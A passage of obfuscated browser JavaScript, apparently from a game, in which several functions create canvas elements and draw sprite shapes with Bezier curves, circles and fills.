			Δ.bezierCurveTo(90.99996948242188 * ᐃ, ᐃ * 162.18402099609375, ᐃ * 99.99996948242188, ᐃ * 153.18402099609375, 117.99996948242188 * ᐃ, ᐃ * 140.18402099609375);
			Δ.bezierCurveTo(ᐃ * 97.99996948242188, 140.18402099609375 * ᐃ, 83.99996948242188 * ᐃ, 139.18402099609375 * ᐃ, ᐃ * 65.99996948242188, ᐃ * 132.18402099609375);
			Δ.bezierCurveTo(ᐃ * 77.99996948242188, 127.18402099609375 * ᐃ, ᐃ * 95.99996948242188, 127.18402099609375 * ᐃ, ᐃ * 115.99996948242188, 127.18402099609375 * ᐃ);
			Δ.bezierCurveTo(91.99996948242188 * ᐃ, ᐃ * 113.18402099609375, 84.99996948242188 * ᐃ, 107.18402099609375 * ᐃ, 76.99996948242188 * ᐃ, ᐃ * 96.18402099609375);
			Δ.bezierCurveTo(94.99996948242188 * ᐃ, 99.18402099609375 * ᐃ, ᐃ * 109.99996948242188, 109.18402099609375 * ᐃ, 123.99996948242188 * ᐃ, 116.18402099609375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 131.99996948242188, ᐃ * 119.18402099609375);
			Δ.bezierCurveTo(ᐃ * 141.99996948242188, ᐃ * 119.18402099609375, 145.99996948242188 * ᐃ, ᐃ * 116.18402099609375, 147.99996948242188 * ᐃ, 109.18402099609375 * ᐃ);
			Δ.bezierCurveTo(151.99996948242188 * ᐃ, ᐃ * 107.18402099609375, 159.99996948242188 * ᐃ, 107.18402099609375 * ᐃ, ᐃ * 156.99996948242188, ᐃ * 123.18402099609375);
			Δ.bezierCurveTo(155.99996948242188 * ᐃ, ᐃ * 140.18402099609375, 142.99996948242188 * ᐃ, ᐃ * 149.18402099609375, ᐃ * 132.99996948242188, 147.18402099609375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 119.99996948242188, ᐃ * 144.18402099609375, ᐃ * 113.99996948242188, ᐃ * 122.18402099609375, ᐃ * 131.99996948242188, ᐃ * 119.18402099609375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⲆΔ], Ⲇᐃ[ⲆΔⲆᐃ], ᐃ * ᐃⵠⵠⲆⵠ);
			return Ⲇⵠ
		}

		function ᐃⵠΔⲆᐃⲆⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 158;
			Ⲇⵠ.height = ᐃ * 201;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(96.5 * ᐃ, ᐃ * 76.421875);
			Δ.bezierCurveTo(ᐃ * 100.5, 64.421875 * ᐃ, ᐃ * 103.5, ᐃ * 62.421875, ᐃ * 110.5, ᐃ * 65.421875);
			Δ.bezierCurveTo(116.5 * ᐃ, ᐃ * 66.421875, 117.5 * ᐃ, 67.421875 * ᐃ, 112.5 * ᐃ, ᐃ * 73.421875);
			Δ.bezierCurveTo(107 * ᐃ, ᐃ * 79.921875, 107 * ᐃ, ᐃ * 79.921875, 101.5 * ᐃ, 86.421875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠᐃᐃΔΔ], Ⲇᐃ[ⵠⵠⲆⵠΔ], ᐃ * ΔᐃⲆⵠⵠΔⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 61.5, 78.421875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 57.5, ᐃ * 73.421875, ᐃ * 51.5, ᐃ * 66.421875, 45.5 * ᐃ, ᐃ * 68.421875);
			Δ.bezierCurveTo(ᐃ * 32.5, 73.421875 * ᐃ, ᐃ * 38.5, ᐃ * 75.421875, 46.5 * ᐃ, ᐃ * 81.421875);
			Δ.bezierCurveTo(51.5 * ᐃ, ᐃ * 84.921875, ᐃ * 51.5, 84.921875 * ᐃ, ᐃ * 56.5, ᐃ * 88.421875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[8], Ⲇᐃ[8], ⵠⵠⲆΔΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(116.5 * ᐃ, ᐃ * 127.421875);
			Δ.bezierCurveTo(ᐃ * 124.5, 108.421875 * ᐃ, ᐃ * 129.5, 104.421875 * ᐃ, ᐃ * 141.5, 107.421875 * ᐃ);
			Δ.bezierCurveTo(156.5 * ᐃ, ᐃ * 112.421875, ᐃ * 153.5, ᐃ * 113.421875, ᐃ * 132.5, 134.421875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 123.5, 141.921875 * ᐃ, ᐃ * 123.5, 141.921875 * ᐃ, ᐃ * 114.5, 149.421875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔΔᐃⲆⵠ], Ⲇᐃ[ⲆⲆᐃᐃⲆ], ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(41.5 * ᐃ, 134.421875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 30.5, ᐃ * 119.421875, 25.5 * ᐃ, 111.421875 * ᐃ, 12.5 * ᐃ, ᐃ * 115.421875);
			Δ.bezierCurveTo(4.5 * ᐃ, 120.421875 * ᐃ, ᐃ * 4.5, ᐃ * 121.421875, 26.5 * ᐃ, ᐃ * 142.421875);
			Δ.bezierCurveTo(35 * ᐃ, ᐃ * 149.921875, 35 * ᐃ, ᐃ * 149.921875, ᐃ * 43.5, 157.421875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃⵠⵠⵠ], Ⲇᐃ[8], 10 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 78.5, ᐃ * 51.921875);
			Δ.bezierCurveTo(ᐃ * 99.5, ᐃ * 75.921875, ᐃ * 110.5, 96.921875 * ᐃ, 118.5 * ᐃ, ᐃ * 120.921875);
			Δ.bezierCurveTo(ᐃ * 121.5, ᐃ * 140.921875, ᐃ * 107.5, 179.921875 * ᐃ, 75.5 * ᐃ, ᐃ * 183.921875);
			Δ.bezierCurveTo(30.5 * ᐃ, 169.921875 * ᐃ, ᐃ * 37.5, ᐃ * 131.921875, ᐃ * 34.5, 120.921875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 41.5, 89.921875 * ᐃ, ᐃ * 61.5, 67.921875 * ᐃ, ᐃ * 78.5, 51.921875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔⵠΔΔⵠ], Ⲇᐃ[ⵠⵠᐃΔⲆ], ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(72.5 * ᐃ, ᐃ * 72.421875);
			Δ.bezierCurveTo(76.5 * ᐃ, ᐃ * 79.421875, 79.5 * ᐃ, 80.421875 * ᐃ, ᐃ * 83.5, 73.421875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 80.5, 96.921875 * ᐃ, ᐃ * 79.5, 114.421875 * ᐃ, 77.5 * ᐃ, 120.421875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[8], Ⲇᐃ[ⲆⲆᐃᐃⲆ], ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(42.5 * ᐃ, 163.421875 * ᐃ);
			Δ.bezierCurveTo(62.5 * ᐃ, ᐃ * 185.421875, 86.5 * ᐃ, 186.421875 * ᐃ, ᐃ * 111.5, ᐃ * 165.421875);
			Δ.bezierCurveTo(107.5 * ᐃ, ᐃ * 176.421875, 95.5 * ᐃ, ᐃ * 187.421875, 75.5 * ᐃ, ᐃ * 188.421875);
			Δ.bezierCurveTo(53.5 * ᐃ, ᐃ * 188.421875, ᐃ * 43.5, 171.421875 * ᐃ, 42.5 * ᐃ, ᐃ * 164.421875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[8], Ⲇᐃ[Δᐃⵠⵠⵠ], 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(79.5 * ᐃ, ᐃ * 61.421875);
			Δ.bezierCurveTo(ᐃ * 88.5, ᐃ * 31.421875, ᐃ * 81.5, 16.421875 * ᐃ, ᐃ * 75.5, 7.421875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 77.5, 28.421875 * ᐃ, ᐃ * 77.5, 37.421875 * ᐃ, 68.5 * ᐃ, 42.421875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 79.5, 57.421875 * ᐃ, ᐃ * 79.5, ᐃ * 58.421875, ᐃ * 80.5, ᐃ * 61.421875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[8], Ⲇᐃ[8], 10 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 72.5, 72.421875 * ᐃ);
			Δ.bezierCurveTo(76.5 * ᐃ, ᐃ * 79.421875, ᐃ * 79.5, ᐃ * 80.421875, 83.5 * ᐃ, 73.421875 * ᐃ);
			Δ.bezierCurveTo(80.5 * ᐃ, 96.921875 * ᐃ, 79.5 * ᐃ, 114.421875 * ᐃ, 77.5 * ᐃ, ᐃ * 120.421875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃᐃⲆᐃ], Ⲇᐃ[8], ᐃ * ⵠᐃⲆⲆΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(96.5 * ᐃ, ᐃ * 76.421875);
			Δ.bezierCurveTo(100.5 * ᐃ, ᐃ * 64.421875, ᐃ * 103.5, ᐃ * 62.421875, ᐃ * 110.5, 65.421875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 116.5, ᐃ * 66.421875, ᐃ * 117.5, ᐃ * 67.421875, ᐃ * 112.5, ᐃ * 73.421875);
			Δ.bezierCurveTo(107 * ᐃ, 79.921875 * ᐃ, ᐃ * 107, 79.921875 * ᐃ, 101.5 * ᐃ, 86.421875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠΔⵠ], Ⲇᐃ[ⵠΔⲆᐃ], ⵠᐃᐃⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 61.5, 78.421875 * ᐃ);
			Δ.bezierCurveTo(57.5 * ᐃ, ᐃ * 73.421875, ᐃ * 51.5, 66.421875 * ᐃ, 45.5 * ᐃ, ᐃ * 68.421875);
			Δ.bezierCurveTo(ᐃ * 32.5, ᐃ * 73.421875, 38.5 * ᐃ, ᐃ * 75.421875, 46.5 * ᐃ, ᐃ * 81.421875);
			Δ.bezierCurveTo(51.5 * ᐃ, ᐃ * 84.921875, ᐃ * 51.5, ᐃ * 84.921875, ᐃ * 56.5, ᐃ * 88.421875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⵠΔ], Ⲇᐃ[2], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(116.5 * ᐃ, ᐃ * 127.421875);
			Δ.bezierCurveTo(ᐃ * 124.5, 108.421875 * ᐃ, 129.5 * ᐃ, ᐃ * 104.421875, ᐃ * 141.5, ᐃ * 107.421875);
			Δ.bezierCurveTo(156.5 * ᐃ, 112.421875 * ᐃ, 153.5 * ᐃ, 113.421875 * ᐃ, ᐃ * 132.5, ᐃ * 134.421875);
			Δ.bezierCurveTo(123.5 * ᐃ, ᐃ * 141.921875, ᐃ * 123.5, 141.921875 * ᐃ, 114.5 * ᐃ, 149.421875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃⵠⵠΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 41.5, ᐃ * 134.421875);
			Δ.bezierCurveTo(30.5 * ᐃ, ᐃ * 119.421875, 25.5 * ᐃ, 111.421875 * ᐃ, 12.5 * ᐃ, 115.421875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 4.5, ᐃ * 120.421875, ᐃ * 4.5, ᐃ * 121.421875, ᐃ * 26.5, 142.421875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 35, ᐃ * 149.921875, 35 * ᐃ, 149.921875 * ᐃ, ᐃ * 43.5, 157.421875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(ᐃ * 78.5, 51.921875 * ᐃ);
			Δ.bezierCurveTo(99.5 * ᐃ, ᐃ * 75.921875, ᐃ * 110.5, ᐃ * 96.921875, ᐃ * 118.5, ᐃ * 120.921875);
			Δ.bezierCurveTo(ᐃ * 121.5, 140.921875 * ᐃ, ᐃ * 107.5, ᐃ * 179.921875, ᐃ * 75.5, ᐃ * 183.921875);
			Δ.bezierCurveTo(30.5 * ᐃ, 169.921875 * ᐃ, ᐃ * 37.5, ᐃ * 131.921875, ᐃ * 34.5, ᐃ * 120.921875);
			Δ.bezierCurveTo(41.5 * ᐃ, 89.921875 * ᐃ, ᐃ * 61.5, ᐃ * 67.921875, 78.5 * ᐃ, 51.921875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆΔⲆ], Ⲇᐃ[2], ᐃ * Ⲇⵠⵠⵠ);
			ⵠᐃᐃ(Δ, ᐃ * 108.5, 148.421875 * ᐃ, ᐃ * ⲆΔⲆΔⵠ);
			ΔⲆ(Δ, Ⲇᐃ[5]);
			ⵠᐃᐃ(Δ, 106.5 * ᐃ, ᐃ * 144.421875, ᐃ * 3);
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔⵠᐃ]);
			ⵠᐃᐃ(Δ, ᐃ * 46.5, ᐃ * 148.421875, ΔΔΔΔΔ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔⲆ]);
			ⵠᐃᐃ(Δ, 44.5 * ᐃ, ᐃ * 144.421875, ᐃ * ⲆⲆΔⲆ);
			ΔⲆ(Δ, Ⲇᐃ[6]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(116.5 * ᐃ, ᐃ * 114.421875);
			Δ.bezierCurveTo(ᐃ * 121.5, ᐃ * 137.421875, 118.5 * ᐃ, ᐃ * 133.421875, 108.5 * ᐃ, ᐃ * 139.421875);
			Δ.bezierCurveTo(ᐃ * 94.5, ᐃ * 146.421875, 96.5 * ᐃ, 148.421875 * ᐃ, 95.5 * ᐃ, 152.421875 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠⲆ], Ⲇᐃ[ⵠΔᐃᐃⵠ], 4 * ᐃ);
			Δ.beginPath();
			Δ.translate(0, ᐃ * -2);
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(35.5 * ᐃ, 131.421875 * ᐃ);
			Δ.bezierCurveTo(36.5 * ᐃ, 140.421875 * ᐃ, 39.5 * ᐃ, ᐃ * 140.421875, 49.5 * ᐃ, ᐃ * 143.421875);
			Δ.bezierCurveTo(59.5 * ᐃ, ᐃ * 149.421875, 57.5 * ᐃ, ᐃ * 151.421875, ᐃ * 59.5, ᐃ * 155.421875);
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⵠⵠΔⲆ], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 84.5, ᐃ * 57.421875);
			Δ.bezierCurveTo(ᐃ * 101.5, 120.421875 * ᐃ, 92.5 * ᐃ, ᐃ * 127.421875, ᐃ * 78.5, 134.421875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 51.5, ᐃ * 131.421875, ᐃ * 63.5, ᐃ * 102.421875, 70.5 * ᐃ, 59.421875 * ᐃ);
			Δ.bezierCurveTo(75 * ᐃ, 55.421875 * ᐃ, ᐃ * 78.5, ᐃ * 52.421875, ᐃ * 79.5, ᐃ * 51.421875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 79.5, 61.421875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 88.5, ᐃ * 31.421875, 81.5 * ᐃ, 16.421875 * ᐃ, ᐃ * 75.5, 7.421875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 77.5, ᐃ * 28.421875, 77.5 * ᐃ, ᐃ * 37.421875, 68.5 * ᐃ, ᐃ * 42.421875);
			Δ.bezierCurveTo(79.5 * ᐃ, ᐃ * 57.421875, 79.5 * ᐃ, ᐃ * 58.421875, 80.5 * ᐃ, ᐃ * 61.421875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[2], ᐃ * ⵠᐃΔΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(72.5 * ᐃ, ᐃ * 72.421875);
			Δ.bezierCurveTo(ᐃ * 76.5, ᐃ * 79.421875, 79.5 * ᐃ, ᐃ * 80.421875, 83.5 * ᐃ, ᐃ * 73.421875);
			Δ.bezierCurveTo(ᐃ * 80.5, 96.921875 * ᐃ, ᐃ * 79.5, ᐃ * 114.421875, 77.5 * ᐃ, 120.421875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[2], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(87.5 * ᐃ, 154.421875 * ᐃ);
			Δ.bezierCurveTo(93.5 * ᐃ, ᐃ * 163.921875, ᐃ * 93.5, 163.921875 * ᐃ, ᐃ * 99.5, 173.421875 * ᐃ);
			Δ.bezierCurveTo(95 * ᐃ, 177.421875 * ᐃ, ᐃ * 95, ᐃ * 177.421875, 90.5 * ᐃ, 181.421875 * ᐃ);
			Δ.bezierCurveTo(89 * ᐃ, 167.921875 * ᐃ, ᐃ * 89, ᐃ * 167.921875, 87.5 * ᐃ, ᐃ * 154.421875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[ᐃⵠⵠᐃᐃ], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(81.5 * ᐃ, 164.421875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 84, 172.921875 * ᐃ, ᐃ * 84, 172.921875 * ᐃ, ᐃ * 86.5, 181.421875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 82.5, 182.421875 * ᐃ, ᐃ * 82.5, ᐃ * 182.421875, ᐃ * 78.5, 183.421875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⵠⲆΔ], Ⲇᐃ[7], ᐃ * 2);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 72.5, ᐃ * 164.421875);
			Δ.bezierCurveTo(ᐃ * 73.5, 173.921875 * ᐃ, ᐃ * 73.5, 173.921875 * ᐃ, ᐃ * 74.5, ᐃ * 183.421875);
			Δ.bezierCurveTo(ᐃ * 70.5, 182.921875 * ᐃ, ᐃ * 70.5, ᐃ * 182.921875, ᐃ * 66.5, 182.421875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[ᐃᐃᐃⵠᐃ], ᐃ * 2);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(65.5 * ᐃ, ᐃ * 156.421875);
			Δ.bezierCurveTo(65 * ᐃ, ᐃ * 168.421875, ᐃ * 65, ᐃ * 168.421875, 64.5 * ᐃ, 180.421875 * ᐃ);
			Δ.bezierCurveTo(58.5 * ᐃ, ᐃ * 177.421875, 58.5 * ᐃ, 177.421875 * ᐃ, ᐃ * 52.5, 174.421875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⵠⲆΔ], Ⲇᐃ[ⵠΔᐃⵠⵠ], ᐃ * 2);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 42.5, ᐃ * 163.421875);
			Δ.bezierCurveTo(ᐃ * 62.5, 185.421875 * ᐃ, ᐃ * 86.5, ᐃ * 186.421875, 111.5 * ᐃ, 165.421875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 107.5, ᐃ * 176.421875, ᐃ * 95.5, ᐃ * 187.421875, ᐃ * 75.5, ᐃ * 188.421875);
			Δ.bezierCurveTo(ᐃ * 53.5, 188.421875 * ᐃ, 43.5 * ᐃ, 171.421875 * ᐃ, ᐃ * 42.5, ᐃ * 164.421875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[2], 4 * ᐃ);
			return Ⲇⵠ
		}

		function ⲆΔⵠᐃⵠΔᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 440;
			Ⲇⵠ.height = ᐃ * 388;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : Ⲇᐃⵠ;
			Δ.translate(ᐃΔΔⲆ * ᐃ, ⵠⵠΔΔ * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 220, 201 * ᐃ, ᐃ * 170.41713528867922);
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], 6 * ᐃ);
			Δ.globalAlpha = 1;
			Δ.translate(ᐃ * -ⲆΔⲆᐃ, ᐃ * -5);
			ⵠᐃᐃ(Δ, 220 * ᐃ, 201 * ᐃ, ᐃ * 170.41713528867922);
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠ], Ⲇᐃ[2], ᐃ * 6);
			ⵠᐃᐃ(Δ, ᐃ * 220, 201 * ᐃ, ᐃ * 130);
			ΔⲆ(Δ, Ⲇᐃ[11], Ⲇᐃ[2], ᐃ * ⵠΔΔΔΔⵠⲆ);
			ⵠᐃᐃ(Δ, 222 * ᐃ, 199 * ᐃ, 120.74767078498864 * ᐃ);
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⲆΔⵠⵠ], 40 * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 220, 200 * ᐃ, ᐃ * 95.44108130150245);
			ΔⲆ(Δ, undefined, Ⲇᐃ[Δᐃⵠⵠ], 15 * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ⵠᐃⵠΔ;
			Δ.translate(ΔᐃΔⲆ * ᐃ, ᐃ * 5);
			ⵠᐃᐃ(Δ, ᐃ * 63, ᐃ * 136, ᐃ * 49.193495504995376);
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ΔΔⵠ], ᐃ * Ⲇᐃⵠᐃ);
			Δ.globalAlpha = 1;
			Δ.translate(-5 * ᐃ, ᐃ * -5);
			ⵠᐃᐃ(Δ, 63 * ᐃ, ᐃ * 136, 49.193495504995376 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔⵠΔΔⵠ], Ⲇᐃ[ⲆⲆΔᐃ], 4 * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 63, 137 * ᐃ, ᐃ * 25.632011235952593);
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠᐃΔΔΔ], Ⲇᐃ[2], ⲆΔⵠᐃ * ᐃ);
			return Ⲇⵠ
		}

		function ΔⲆΔⵠⵠΔⵠⵠΔ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 496;
			Ⲇⵠ.height = 520 * ᐃ;
			Δ.globalAlpha = ΔⵠⲆΔ;
			Δ.translate(0, ᐃ * -ⵠⵠⲆΔΔ);
			ⵠᐃᐃ(Δ, 247.01138305664062 * ᐃ, ᐃ * 250.13068389892578, 232.81967270830015 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠ], Ⲇᐃ[ⲆⲆΔᐃ], ᐃ * ΔⵠⵠΔⵠᐃⲆ);
			Δ.globalCompositeOperation = ⵠ[172];
			ⵠᐃᐃ(Δ, ᐃ * 247.01138305664062, ᐃ * 249.3125, 161.4465855941215 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠ], Ⲇᐃ[ΔⲆⵠⲆ], 14 * ᐃ);
			Δ.globalCompositeOperation = ⵠ[512];
			return Ⲇⵠ
		}

		function ΔⵠᐃⲆᐃⵠΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 316;
			Ⲇⵠ.height = ᐃ * 365;
			Δ.save();
			Δ.translate(156.07142639160156 * ᐃ, 51.81248474121094 * ᐃ);
			Δ.rotate(0);
			Ⲇᐃᐃ(Δ, ᐃ * -21.5, ᐃ * -34, ᐃ * 43, ᐃ * 68, 8 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], 15 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
			Δ.moveTo(ᐃ * 110.57142639160156, 197.09820556640625 * ᐃ);
			Δ.bezierCurveTo(158.07142639160156 * ᐃ, ᐃ * 179.09820556640625, ᐃ * 158.07142639160156, ᐃ * 179.09820556640625, ᐃ * 205.57142639160156, 161.09820556640625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 205.57142639160156, 235.45535278320312 * ᐃ, ᐃ * 205.57142639160156, 235.45535278320312 * ᐃ, ᐃ * 205.57142639160156, 309.8125 * ᐃ);
			Δ.bezierCurveTo(205.57142639160156 * ᐃ, 323.8125 * ᐃ, 200.57142639160156 * ᐃ, 325.8125 * ᐃ, ᐃ * 187.57142639160156, 326.8125 * ᐃ);
			Δ.bezierCurveTo(155.57142639160156 * ᐃ, 326.3125 * ᐃ, 155.57142639160156 * ᐃ, 326.3125 * ᐃ, 123.57142639160156 * ᐃ, 325.8125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 111.57142639160156, ᐃ * 326.8125, 109.57142639160156 * ᐃ, 321.8125 * ᐃ, ᐃ * 110.57142639160156, ᐃ * 312.8125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠᐃ], Ⲇᐃ[4], ᐃ * 15);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(126.57142639160156 * ᐃ, ᐃ * 67.38392639160156);
			Δ.bezierCurveTo(126.57142639160156 * ᐃ, 57.38392639160156 * ᐃ, 132.57142639160156 * ᐃ, 54.38392639160156 * ᐃ, ᐃ * 140.57142639160156, 54.38392639160156 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 177.57142639160156, 55.38392639160156 * ᐃ, 158.07142639160156 * ᐃ, 54.38392639160156 * ᐃ, 175.57142639160156 * ᐃ, 54.38392639160156 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 185.57142639160156, 56.38392639160156 * ᐃ, 185.57142639160156 * ᐃ, 57.38392639160156 * ᐃ, 184.57142639160156 * ᐃ, ᐃ * 66.38392639160156);
